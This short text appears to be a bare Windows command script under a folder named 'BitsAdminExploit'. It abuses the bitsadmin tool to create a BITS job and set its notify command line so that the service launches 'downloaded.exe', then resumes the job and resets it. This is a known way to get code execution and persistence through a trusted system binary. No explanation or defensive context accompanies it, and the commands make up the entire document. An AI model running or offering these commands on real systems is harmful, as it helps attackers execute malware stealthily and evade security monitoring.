bitsadmin /create 1

bitsadmin /addfile 1 "C:\Temp\BitsAdminExploit\downloaded.exe" "C:\Temp\BitsAdminExploit\downloaded.exe"

bitsadmin /SetNotifyCmdLine 1 "C:\Temp\BitsAdminExploit\downloaded.exe" NULL

bitsadmin /RESUME 1

bitsadmin /Reset
